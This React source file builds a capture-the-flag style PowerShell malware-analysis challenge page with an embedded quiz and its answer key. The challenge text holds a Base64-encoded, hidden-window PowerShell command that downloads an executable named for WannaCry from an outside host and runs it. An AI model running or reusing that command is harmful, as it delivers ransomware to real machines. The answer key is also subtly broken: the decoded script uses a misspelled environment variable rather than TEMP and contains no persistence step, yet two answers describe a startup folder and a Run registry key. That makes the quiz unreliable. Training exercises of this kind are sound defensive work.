import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import {
  ArrowLeft,
  CheckCircle2,
  XCircle,
  HelpCircle,
  Download,
  User,
  Droplet,
  Trophy,
  ChevronDown,
  ChevronUp,
} from 'lucide-react';
import Confetti from 'react-confetti';
import { motion } from 'framer-motion';

// Reusable QuestionCard Component with question numbering added
const QuestionCard = ({
  question,
  hintsRemaining,
  onAnswerChange,
  onSubmit,
  onToggleHint,
}) => {
  return (
    <motion.div
      initial={{ opacity: 1, scale: 1 }}
      animate={{
        opacity: question.isCorrect === true ? 0.5 : 1,
        scale: question.isCorrect === true ? 0.98 : 1,
      }}
      transition={{ duration: 0.5 }}
      className="bg-primary-dark/30 rounded-lg p-6 border border-primary-blue/20 hover:bg-primary-dark/40 hover:border-primary-blue transition-all"
    >
      <div className="flex items-start justify-between">
        <div className="flex-1">
          {/* Automatically prepend question number */}
          <h3 className="text-lg font-semibold mb-4">
            {question.id}. {question.text}
          </h3>
          <div className="flex items-center space-x-4">
            <input
              type="text"
              className="bg-background border border-primary-blue/20 rounded-md px-4 py-2 focus:outline-none focus:border-primary-blue"
              placeholder="Enter your answer"
              value={question.userAnswer}
              onChange={(e) => onAnswerChange(question.id, e.target.value)}
              onKeyDown={(e) => {
                if (e.key === 'Enter' && !question.isCorrect) {
                  onSubmit(question.id, question.userAnswer);
                }
              }}
              disabled={question.isCorrect === true}
            />
            <button
              className={`text-gray-500 hover:text-gray-400 transition-all ${
                hintsRemaining === 0 ? "opacity-50 cursor-not-allowed" : ""
              }`}
              onClick={() => onToggleHint(question.id)}
              disabled={question.isCorrect === true || hintsRemaining === 0}
            >
              <HelpCircle className="w-5 h-5" />
            </button>
            {!question.isCorrect && (
              <button
                className="bg-blue-600 text-white py-2 px-4 rounded-lg hover:bg-blue-700 active:scale-95 transition-all"
                onClick={() => onSubmit(question.id, question.userAnswer)}
              >
                Submit
              </button>
            )}
            {question.isCorrect !== undefined &&
              (question.isCorrect ? (
                <CheckCircle2 className="w-6 h-6 text-green-500" />
              ) : (
                <XCircle className="w-6 h-6 text-red-500" />
              ))}
          </div>
          {question.showHint && (
            <div className="mt-4 text-gray-300 italic">{question.hint}</div>
          )}
        </div>
      </div>
    </motion.div>
  );
};

function PowerShellChallenge() {
  const [questions, setQuestions] = useState([
    {
      id: 1,
      text: "What encoding method does the script use?",
      answer: "Base64",
      hint: "Look for a common encoding technique often used for obfuscation.",
      showHint: false,
      userAnswer: "",
      isCorrect: undefined,
    },
    {
      id: 2,
      text: "What is the URL from which the malicious file is downloaded?",
      answer:
        "http://uhxqin.biz/csgeaivqpodqs/5849b1b61e88f7461064b986a204b9c7_wannacry.exe",
      hint: "The URL is part of the PowerShell command, check for the full string.",
      showHint: false,
      userAnswer: "",
      isCorrect: undefined,
    },
    {
      id: 3,
      text: "What is the hash of the downloaded malware file?",
      answer: "5849b1b61e88f7461064b986a204b9c7",
      hint: "The hash is often a part of the file's metadata, check the script for it.",
      showHint: false,
      userAnswer: "",
      isCorrect: undefined,
    },
    {
      id: 4,
      text: "What type of malware is being delivered by this script?",
      answer: "Ransomware",
      hint: "Consider the impact of the encryption process mentioned in the introduction.",
      showHint: false,
      userAnswer: "",
      isCorrect: undefined,
    },
    {
      id: 5,
      text: "What is the name of the downloaded file?",
      answer: "update_service.exe",
      hint: "The file name is mentioned in the PowerShell command.",
      showHint: false,
      userAnswer: "",
      isCorrect: undefined,
    },
    {
      id: 6,
      text: "Which PowerShell command is used to download the file?",
      answer:
        "Invoke-WebRequest -Uri $update -OutFile $destinationPath",
      hint: "Search for the download command within the script.",
      showHint: false,
      userAnswer: "",
      isCorrect: undefined,
    },
    {
      id: 7,
      text: "Where is the file stored on the system before execution?",
      answer: "TEMP",
      hint: "Check the file path in the command for where the file is stored.",
      showHint: false,
      userAnswer: "",
      isCorrect: undefined,
    },
    {
      id: 8,
      text: "Which command is used to execute the downloaded file?",
      answer:
        "Start-Process -FilePath $destinationPath -WindowStyle Hidden",
      hint: "Look for a command that runs an executable file in the script.",
      showHint: false,
      userAnswer: "",
      isCorrect: undefined,
    },
    {
      id: 9,
      text: "Which method does the script use to maintain persistence?",
      answer: "Startup folder",
      hint: "Persistence is often achieved by placing the file in a location that runs on startup.",
      showHint: false,
      userAnswer: "",
      isCorrect: undefined,
    },
    {
      id: 10,
      text: "Which Windows registry key is modified to establish persistence?",
      answer: "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      hint: "Persistence is often achieved through Windows registry keys.",
      showHint: false,
      userAnswer: "",
      isCorrect: undefined,
    },
  ]);

  const [hintsRemaining, setHintsRemaining] = useState(3);
  const [showConfetti, setShowConfetti] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showError, setShowError] = useState(false);
  const [questionsVisible, setQuestionsVisible] = useState(false);

  const allQuestionsAnswered = questions.every((q) => q.isCorrect !== undefined);
  const correctAnswersCount = questions.filter((q) => q.isCorrect).length;
  const totalQuestions = questions.length;
  const progress = (correctAnswersCount / totalQuestions) * 100;

  // Update answer as the user types
  const handleAnswerChange = (id, value) => {
    setQuestions(
      questions.map((q) => (q.id === id ? { ...q, userAnswer: value } : q))
    );
  };

  // Submit answer and check correctness
  const handleAnswerSubmit = (id, answer) => {
    setQuestions(
      questions.map((q) => {
        if (q.id === id) {
          return {
            ...q,
            userAnswer: answer.toLowerCase(),
            isCorrect: answer.toLowerCase() === q.answer.toLowerCase(),
          };
        }
        return q;
      })
    );
  };

  // Toggle hint and decrement available hints if not already shown
  const toggleHint = (id) => {
    if (hintsRemaining > 0) {
      setQuestions(
        questions.map((q) => {
          if (q.id === id && !q.showHint) {
            setHintsRemaining(hintsRemaining - 1);
            return { ...q, showHint: true };
          }
          return q;
        })
      );
    }
  };

  const handleComplete = () => {
    if (allQuestionsAnswered && correctAnswersCount === totalQuestions) {
      setShowConfetti(true);
      setShowSuccess(true);
      setShowError(false);
      window.scrollTo({ top: 0, behavior: "smooth" });
    } else {
      setShowError(true);
      setShowConfetti(false);
      setShowSuccess(false);
    }
  };

  return (
    <div className="min-h-screen bg-background text-white font-sans">
      {/* Sticky Header */}
      <motion.nav
        className="sticky top-0 z-50 bg-primary-dark border-b border-primary-blue/20"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.5 }}
      >
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between h-16 items-center">
            <div className="flex items-center space-x-4">
              <Link
                to="/challenges"
                className="text-primary-blue hover:text-primary-blue/80 flex items-center"
              >
                <ArrowLeft className="w-5 h-5 mr-2" />
                Back to Challenges
              </Link>
            </div>
          </div>
        </div>
      </motion.nav>

      {/* Banner */}
      <motion.div
        className="flex justify-center mb-12"
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
      >
        <div className="relative group">
          <div className="absolute inset-0 rounded-lg bg-primary-blue/40 blur-lg group-hover:opacity-100 opacity-0 transition-opacity duration-300"></div>
          <img
            src="/Challenges/powershell-banner2.jpg"
            alt="PowerShell Challenge Banner"
            className="w-auto max-h-80 object-cover rounded-lg shadow-lg group-hover:scale-105 group-hover:rotate-1 transition-transform duration-300 ease-in-out relative z-10"
          />
        </div>
      </motion.div>

      <div className="max-w-4xl mx-auto px-4 py-12 -mt-16 relative z-10">
        <motion.h1
          className="text-3xl font-bold mb-8"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
        >
          PowerShell Analysis Challenge
        </motion.h1>

        {/* Progress Section */}
        <motion.div
          className="mb-6"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.5 }}
        >
          <div className="text-lg font-semibold mb-2">Progress</div>
          <div className="w-full bg-primary-dark/20 h-4 rounded-full relative overflow-hidden">
            <div
              className="h-4 rounded-full transition-all duration-500 ease-in-out"
              style={{
                width: `${progress}%`,
                background: "linear-gradient(90deg, #4ade80, #3b82f6)",
                boxShadow: "0 0 8px rgba(59, 130, 246, 0.6)",
              }}
            >
              <div className="text-center text-white text-sm font-semibold absolute inset-0 flex items-center justify-center">
                {`${Math.round(progress)}%`}
              </div>
            </div>
          </div>
          <div className="text-sm mt-2 text-gray-400">
            {correctAnswersCount} of {totalQuestions} correct
          </div>
        </motion.div>

        {/* Hints Remaining */}
        <motion.div
          className="text-gray-400 mb-6"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.5 }}
        >
          Hints Remaining: {hintsRemaining}
        </motion.div>

        {/* Challenge Introduction */}
        <motion.div
          className="bg-primary-dark/30 rounded-lg p-6 border border-primary-blue/20 mb-8"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
        >
          <h2 className="text-xl font-semibold mb-4">Challenge Introduction</h2>
          <p className="text-gray-400 mb-6">
            An endpoint was suddenly compromised after a PowerShell command was executed.
            Your task is to analyze the script and determine the steps the attacker took,
            from downloading the malicious file to establishing persistence.
          </p>
          <div className="bg-background border border-primary-blue/40 p-4 rounded-lg shadow-md overflow-x-auto">
            <pre className="text-gray-300 font-mono whitespace-pre-wrap break-words">
              {`powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand JHVwZGF0ZSA9ICJodHRwOi8vdWh4cWluLmJpei9jc2dlYWl2cXBvZHFzLzU4NDliMWI2MWU4OGY3NDYxMDY0Yjk4NmEyMDRiOWM3X3dhbm5hY3J5LmV4ZSIgDQokZGVzdGluYXRpb25QYXRoID0gIiRlbnY6VElNRV9UQUJMRVx1cGRhdGVfc2VydmljZS5leGUiDQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cGRhdGUgLU91dEZpbGUgJGRlc3RpbmF0aW9uUGF0aA0KU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJGRlc3RpbmF0aW9uUGF0aCAiJGVudjpUSU1FX1RBTExFXF91cGRhdGVfc2VydmljZS5leGUiIC1XaW5kb3dTdHlsZSBIaWRkZW4=`}
            </pre>
          </div>
        </motion.div>

        {/* Questions Dropdown Tab */}
        <motion.div
          className="mb-6 text-center"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.5 }}
        >
          <div
            onClick={() => setQuestionsVisible(!questionsVisible)}
            className="cursor-pointer border border-gray-600 rounded-lg px-4 py-2 flex items-center justify-center mx-auto hover:bg-gray-700 transition-all"
          >
            <span className="mr-2">Questions</span>
            {questionsVisible ? (
              <ChevronUp className="w-5 h-5" />
            ) : (
              <ChevronDown className="w-5 h-5" />
            )}
          </div>
        </motion.div>

        {/* Questions Section */}
        {questionsVisible && (
          <motion.div
            className="space-y-6"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.5 }}
          >
            {questions.map((question) => (
              <QuestionCard
                key={question.id}
                question={question}
                hintsRemaining={hintsRemaining}
                onAnswerChange={handleAnswerChange}
                onSubmit={handleAnswerSubmit}
                onToggleHint={toggleHint}
              />
            ))}
          </motion.div>
        )}

        {/* Complete Button */}
        <motion.div
          className="max-w-4xl mx-auto px-4 mt-8 text-center"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.5 }}
        >
          <button
            onClick={handleComplete}
            className="bg-green-600 text-white py-3 px-6 rounded-lg hover:bg-green-700 active:scale-95 transition-all flex items-center justify-center space-x-2"
          >
            <CheckCircle2 className="w-5 h-5" />
            <span>Complete Challenge</span>
          </button>
          {showError && (
            <div className="mt-4 p-4 bg-red-600 text-white rounded-lg">
              <p>Please answer all questions correctly before completing the challenge.</p>
            </div>
          )}
        </motion.div>

        {/* Success Message and Confetti */}
        {showSuccess && (
          <>
            <Confetti width={window.innerWidth} height={window.innerHeight} />
            <motion.div
              className="max-w-4xl mx-auto px-4 mt-8 text-center"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.5 }}
            >
              <div className="p-4 bg-green-600 text-white rounded-lg">
                <p className="text-lg font-semibold">Congratulations!</p>
                <p>
                  You have completed the challenge with {correctAnswersCount} out of {totalQuestions} correct answers.
                </p>
              </div>
            </motion.div>
          </>
        )}

        {/* Combined frame for Created by and First Blood */}
        <motion.div
          className="max-w-4xl mx-auto px-4 mt-8"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.5 }}
        >
          <div className="bg-primary-dark/40 p-6 rounded-xl border border-primary-blue/20 shadow-lg hover:shadow-xl transition-shadow duration-300">
            <div className="flex justify-center space-x-8">
              {/* Created by section */}
              <div className="flex items-center space-x-4">
                <div className="p-3 bg-primary-blue/10 rounded-full">
                  <User className="w-6 h-6 text-primary-blue" />
                </div>
                <div>
                  <p className="text-gray-400 text-sm">Created by:</p>
                  <div className="flex items-center space-x-2">
                    <p className="text-primary-blue hover:text-primary-blue/80 font-semibold">HackTheHackers</p>
                  </div>
                </div>
              </div>

              {/* Divider */}
              <div className="w-px bg-primary-blue/20 h-12"></div>

              {/* First Blood section */}
              <div className="flex items-center space-x-4">
                <div className="p-3 bg-red-500/10 rounded-full">
                  <Droplet className="w-6 h-6 text-red-500" />
                </div>
                <div>
                  <p className="text-gray-400 text-sm">First Blood:</p>
                  <div className="flex items-center space-x-2">
                    <Trophy className="w-5 h-5 text-yellow-500" />
                    <p className="text-red-500 hover:text-red-400 font-semibold">User</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </motion.div>
      </div>

      {/* Footer */}
      <footer className="bg-primary-dark/30 text-white py-8 border-t border-primary-blue/20">
        <div className="max-w-7xl mx-auto px-4 text-center">
          <p className="text-gray-400">© 2025 HackTheHackers. All rights reserved.</p>
        </div>
      </footer>
    </div>
  );
}

export default PowerShellChallenge;
